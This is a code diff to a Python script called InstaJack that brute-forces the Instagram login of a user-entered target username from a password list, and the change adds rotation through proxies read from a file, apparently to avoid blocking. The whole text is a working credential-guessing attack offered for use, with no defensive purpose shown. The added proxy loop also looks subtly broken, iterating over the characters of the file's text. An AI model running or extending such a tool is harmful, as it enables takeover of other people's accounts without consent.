@@ -2,6 +2,8 @@ from instabot import Bot
 import os
 b = Bot()
 f = open("passwords.txt","r+")
+g = open("proxies.txt","r")
+proxyf = g.read()
 passwords = f.readlines()
 class bcolors:
     HEADER = '\033[95m'
@@ -31,9 +33,10 @@ print(bcolors.BOLD+"InstaJack - Brute Force Instagram login using InstaJack\nAut
 usr = str(input(bcolors.WARNING+'Enter the target username : '))
 print(bcolors.OKCYAN+"Write the passwords to passwords.txt file\nHit Enter to begin the attack")
 for pwd in passwords:
-    try:
-        b.login(username=usr,password=pwd)
-        print(bcolors.OKGREEN + "[+] Boom! Password Found :- ",pwd)
-        break
-    except:
-        print(bcolors.WARNING + "[-] Password",pwd," not matched!")
+    for proxies in proxyf:
+        try:
+            b.login(username=usr,password=pwd, proxy=proxies)
+            print(bcolors.OKGREEN + "[+] Boom! Password Found :- ",pwd)
+            break
+        except:
+            print(bcolors.WARNING + "[-] Password",pwd," not matched!")
